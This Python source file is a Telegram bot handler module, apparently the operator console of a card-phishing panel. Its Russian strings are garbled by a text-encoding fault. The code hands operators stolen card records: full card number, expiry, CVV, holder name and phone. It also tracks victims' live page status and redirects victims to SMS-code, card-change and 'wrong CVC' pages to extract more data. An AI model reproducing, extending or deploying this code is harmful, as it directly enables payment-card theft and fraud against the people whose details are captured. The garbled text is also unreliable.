from aiogram import Dispatcher, types, F
import httpx
import sys
import os

# –î–æ–±–∞–≤–ª—è–µ–º –∫–æ—Ä–Ω–µ–≤—É—é –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é –≤ –ø—É—Ç—å –¥–ª—è –∏–º–ø–æ—Ä—Ç–æ–≤
sys.path.append(os.path.join(os.path.dirname(__file__), '../..'))

# –¢–µ–ø–µ—Ä—å –∏–º–ø–æ—Ä—Ç–∏—Ä—É–µ–º –Ω–∞—à–∏ –º–æ–¥—É–ª–∏
from database.crud import get_log_by_session, update_log_taken_by
from api.handy_api import get_card_info, format_card_info
from bot.keyboards import get_management_keyboard, get_taken_keyboard
import config

async def take_log(callback: types.CallbackQuery):
    session_id = callback.data.split(":")[1]
    
    log = get_log_by_session(session_id)
    if not log:
        await callback.answer("–õ–æ–≥ –Ω–µ –Ω–∞–π–¥–µ–Ω", show_alert=True)
        return
        
    if log['taken_by']:
        await callback.answer("–≠—Ç–æ—Ç –ª–æ–≥ —É–∂–µ –∑–∞–Ω—è—Ç", show_alert=True)
        return

    update_log_taken_by(session_id, callback.from_user.id)

    async with httpx.AsyncClient() as client:
        customer = (await client.get(f"{config.SERVER_URL}/customer/{session_id}")).json()
        card = (await client.get(f"{config.SERVER_URL}/card/{session_id}")).json()
        booking = (await client.get(f"{config.SERVER_URL}/booking/{session_id}")).json()

    booking_id = log['booking_id'] or "N/A"
    client_id = log['client_id'] or "N/A"
    
    full_pan = card.get('full_pan', '')
    if full_pan:
        bin_number = full_pan[:6]
        card_info = await get_card_info(bin_number)
        card_info_text = format_card_info(card_info)
    else:
        card_info_text = "‚ùå –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –∫–∞—Ä—Ç–µ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞"
    
    text = (
        f"–õ–æ–≥ #{booking_id} || #{client_id}\n\n"
        f"üí≥  –ö–∞—Ä—Ç–∞: <code>{full_pan}</code>\n"
        f"üóìÔ∏è  –°—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è –∫–∞—Ä—Ç—ã: {card.get('expire_date')}\n"
        f"üîí  CVV: {card.get('cvv')}\n\n"
        f"üìä <b>–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –∫–∞—Ä—Ç–µ:</b>\n"
        f"{card_info_text}\n\n"
        f"üë§  –ò–º—è: {customer.get('name')} {customer.get('surname')}\n"
        f"üìû  –ù–æ–º–µ—Ä: {customer.get('phone')}\n\n"
        f"üí∏  –°—É–º–º–∞: {booking.get('total_amount')}.00 AED"
    )

    await callback.bot.send_message(
        callback.from_user.id, 
        text, 
        parse_mode="HTML", 
        reply_markup=get_management_keyboard(session_id)
    )
    
    await callback.message.edit_reply_markup(reply_markup=get_taken_keyboard(callback.from_user.username))
    await callback.answer()

async def check_online_status(callback: types.CallbackQuery):
    session_id = callback.data.split(":")[1]
    
    log = get_log_by_session(session_id)
    if not log or log['taken_by'] != callback.from_user.id:
        await callback.answer("–£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –ª–æ–≥—É", show_alert=True)
        return
    
    try:
        async with httpx.AsyncClient() as client:
            response = await client.get(f"{config.SERVER_URL}/check-online-status/{session_id}")
            
            if response.status_code == 200:
                data = response.json()
                booking_id = log['booking_id']
                client_id = log['client_id']
                
                if data.get("online"):
                    current_page = data.get("currentPageDisplay", "Unknown")
                    message = (
                        f"üÜî #{booking_id} || #{client_id}\n\n"
                        f"üü¢ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –û–ù–õ–ê–ô–ù\n\n"
                        f"üìç –¢–µ–∫—É—â–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞: {current_page}\n"
                        f"‚è∞ –ü–æ—Å–ª–µ–¥–Ω—è—è –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å: —Ç–æ–ª—å–∫–æ —á—Ç–æ"
                    )
                else:
                    last_known_page = data.get("lastKnownPageDisplay", "–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ")
                    last_seen = data.get("lastSeen", "–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ")
                    message = (
                        f"üÜî #{booking_id} || #{client_id}\n\n"
                        f"üî¥ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –û–§–§–õ–ê–ô–ù\n\n"
                        f"üìÑ –ü–æ—Å–ª–µ–¥–Ω—è—è –∏–∑–≤–µ—Å—Ç–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞: {last_known_page}\n"
                        f"‚è∞ –ü–æ—Å–ª–µ–¥–Ω—è—è –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å: {last_seen}"
                    )
                await callback.message.answer(message)
            else:
                await callback.message.answer("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å —Å—Ç–∞—Ç—É—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è")
                
    except Exception as e:
        print(f"Error checking online status: {e}")
        await callback.message.answer("‚ùå –û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å —Å–µ—Ä–≤–µ—Ä–æ–º")
    
    await callback.answer()

async def handle_redirect_action(callback: types.CallbackQuery):
    action, session_id = callback.data.split(":")
    
    log = get_log_by_session(session_id)
    if not log or log['taken_by'] != callback.from_user.id:
        await callback.answer("–£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –ª–æ–≥—É", show_alert=True)
        return
    
    endpoints = {
        "balance": "/redirect-balance",
        "sms": "/redirect-sms", 
        "change": "/redirect-change",
        "success": "/redirect-success",
        "wrong_cvc": "/redirect-wrong-cvc"  # –î–æ–±–∞–≤–ª—è–µ–º –Ω–æ–≤—ã–π —ç–Ω–¥–ø–æ–∏–Ω—Ç
    }
    
    try:
        async with httpx.AsyncClient() as client:
            response = await client.post(
                f"{config.SERVER_URL}{endpoints[action]}", 
                json={
                    "sessionId": session_id,
                    "clientId": log['client_id']
                }
            )
            
            if response.status_code == 200:
                messages = {
                    "balance": "‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –±–∞–ª–∞–Ω—Å–∞",
                    "sms": "‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –≤–≤–æ–¥–∞ –∫–æ–¥–∞",
                    "change": "‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –∑–∞–º–µ–Ω—ã –∫–∞—Ä—Ç—ã", 
                    "success": "‚úÖ –£—Å–ø–µ—à–Ω–∞—è –æ–ø–ª–∞—Ç–∞!",
                    "wrong_cvc": "‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –≤–≤–æ–¥–∞ –∫–∞—Ä—Ç—ã –∑–∞–Ω–æ–≤–æ (–Ω–µ–≤–µ—Ä–Ω—ã–π CVC)"
                }
                await callback.message.answer(messages[action])
                
            else:
                await callback.message.answer("‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è")
                
    except Exception as e:
        print(f"Error redirecting user: {e}")
        await callback.message.answer("‚ùå –û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å —Å–µ—Ä–≤–µ—Ä–æ–º")

def register_callbacks(dp: Dispatcher):
    dp.callback_query.register(take_log, F.data.startswith("take:"))
    dp.callback_query.register(check_online_status, F.data.startswith("check_online:"))
    dp.callback_query.register(handle_redirect_action, F.data.startswith("balance:"))
    dp.callback_query.register(handle_redirect_action, F.data.startswith("sms:"))
    dp.callback_query.register(handle_redirect_action, F.data.startswith("change:"))
    dp.callback_query.register(handle_redirect_action, F.data.startswith("success:"))
    dp.callback_query.register(handle_redirect_action, F.data.startswith("wrong_cvc:"))  # –î–æ–±–∞–≤–ª—è–µ–º –Ω–æ–≤—É—é –∫–Ω–æ–ø–∫—É